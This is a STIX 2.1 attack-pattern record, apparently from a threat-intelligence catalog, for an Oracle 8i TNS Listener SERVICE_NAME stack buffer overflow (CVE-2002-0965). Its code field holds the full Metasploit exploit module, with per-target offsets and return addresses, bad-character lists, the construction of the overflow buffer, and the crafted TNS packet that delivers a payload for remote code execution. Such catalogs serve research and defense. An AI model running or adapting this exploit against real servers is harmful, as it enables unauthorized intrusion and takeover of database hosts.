{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d337c969-8f98-4792-92a2-b3dac05fe444",
    "created": "2024-08-14T16:50:18.356975Z",
    "modified": "2024-08-14T16:50:18.356979Z",
    "name": "Oracle 8i TNS Listener SERVICE_NAME Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Oracle. When sending a specially crafted packet containing a long SERVICE_NAME to the TNS service, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/oracle/tns_service_name.rb",
            "external_id": "tns_service_name.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-0965"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technology/deploy/security/pdf/net9_dos_alert.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::TNS\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle 8i TNS Listener SERVICE_NAME Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Oracle. When\n        sending a specially crafted packet containing a long SERVICE_NAME\n        to the TNS service, an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2002-0965'],\n          [ 'OSVDB', '5041'],\n          [ 'BID', '4845'],\n          [ 'URL', 'http://www.oracle.com/technology/deploy/security/pdf/net9_dos_alert.pdf' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\\\$\\% ()\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Oracle 8.1.7.0.0 Standard Edition (Windows 2000)',   { 'Offset' => 6396, 'Ret' => 0x60a1e154 } ],\n          [ 'Oracle 8.1.7.0.0 Standard Edition (Windows 2003)',   { 'Offset' => 6392, 'Ret' => 0x60a1e154 }] ,\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2002-05-27'))\n\n    register_options([Opt::RPORT(1521)])\n  end\n\n  def check\n    connect\n\n    version = \"(CONNECT_DATA=(COMMAND=VERSION))\"\n    pkt = tns_packet(version)\n    sock.put(pkt)\n\n    sock.get_once\n    res = sock.get_once(-1, 1)\n\n    disconnect\n\n    if ( res and res =~ /32-bit Windows: Version 8\\.1\\.7\\.0\\.0/ )\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    buff =  rand_text_alpha_upper(target['Offset'] - payload.encoded.length) + payload.encoded\n    buff << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')\n    buff << [0xe8, -550].pack('CV') + rand_text_alpha_upper(400)\n\n    sploit = \"(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=#{rhost}(PORT=#{rport}))(CONNECT_DATA=(SERVICE_NAME=#{buff})(CID=(PROGRAM=MSF))))\"\n\n    pkt = tns_packet(sploit)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(pkt)\n\n    handler\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-05-27",
    "x_mitre_platforms": [
        "win'"
    ]
}